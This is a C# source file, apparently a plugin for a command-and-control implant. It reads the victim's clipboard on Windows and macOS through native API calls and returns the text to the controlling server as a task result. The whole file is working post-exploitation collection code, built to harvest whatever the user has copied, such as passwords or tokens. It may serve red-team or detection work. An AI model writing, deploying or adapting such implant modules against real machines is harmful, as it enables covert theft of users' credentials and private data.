using Agent.Interfaces;
using System.Text;
using System.ComponentModel;
using System.Runtime.InteropServices;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    static class WindowsClipboard
    {
        static void TryOpenClipboard()
        {
            var num = 10;
            while (true)
            {
                if (OpenClipboard(default))
                {
                    break;
                }

                if (--num == 0)
                {
                    ThrowWin32();
                }

                Thread.Sleep(100);
            }
        }

        public static string? GetText()
        {
            if (!IsClipboardFormatAvailable(cfUnicodeText))
            {
                return null;
            }
            TryOpenClipboard();

            return InnerGet();
        }

        static string? InnerGet()
        {
            IntPtr handle = default;

            IntPtr pointer = default;
            try
            {
                handle = GetClipboardData(cfUnicodeText);
                if (handle == default)
                {
                    return null;
                }

                pointer = GlobalLock(handle);
                if (pointer == default)
                {
                    return null;
                }

                var size = GlobalSize(handle);
                var buff = new byte[size];

                Marshal.Copy(pointer, buff, 0, size);

                return Encoding.Unicode.GetString(buff).TrimEnd('\0');
            }
            finally
            {
                if (pointer != default)
                {
                    GlobalUnlock(handle);
                }

                CloseClipboard();
            }
        }

        const uint cfUnicodeText = 13;

        static void ThrowWin32()
        {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("User32.dll", SetLastError = true)]
        static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseClipboard();

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern int GlobalSize(IntPtr hMem);
    }

    //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
    //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/OsxClipboard.cs
    static class OsxClipboard
    {
        static IntPtr nsString = objc_getClass("NSString");
        static IntPtr nsPasteboard = objc_getClass("NSPasteboard");
        static IntPtr nsStringPboardType;
        static IntPtr utfTextType;
        static IntPtr generalPasteboard;
        static IntPtr initWithUtf8Register = sel_registerName("initWithUTF8String:");
        static IntPtr allocRegister = sel_registerName("alloc");
        static IntPtr stringForTypeRegister = sel_registerName("stringForType:");
        static IntPtr utf8Register = sel_registerName("UTF8String");
        static IntPtr generalPasteboardRegister = sel_registerName("generalPasteboard");

        static OsxClipboard()
        {
            utfTextType = objc_msgSend(objc_msgSend(nsString, allocRegister), initWithUtf8Register, "public.utf8-plain-text");
            nsStringPboardType = objc_msgSend(objc_msgSend(nsString, allocRegister), initWithUtf8Register, "NSStringPboardType");
            generalPasteboard = objc_msgSend(nsPasteboard, generalPasteboardRegister);
        }

        public static string? GetText()
        {
            var ptr = objc_msgSend(generalPasteboard, stringForTypeRegister, nsStringPboardType);
            var charArray = objc_msgSend(ptr, utf8Register);
            return Marshal.PtrToStringAnsi(charArray);
        }

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_getClass(string className);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, string arg1);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, IntPtr arg1);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, IntPtr arg1, IntPtr arg2);

        [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
        static extern IntPtr sel_registerName(string selectorName);
    }
    public class Plugin : IPlugin
    {
        public string Name => "get-clipboard";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (OperatingSystem.IsMacOS())
                {
                    await messageManager.Write(OsxClipboard.GetText(), job.task.id, true);
                }
                else if (OperatingSystem.IsWindows())
                {
                    await messageManager.Write(WindowsClipboard.GetText(), job.task.id, true);
                }
                else
                {
                    await messageManager.Write("Not implemented on this OS yet.", job.task.id, true, "error");
                }
            }
            catch (Exception e)
            {
                await messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
        }
    }
}
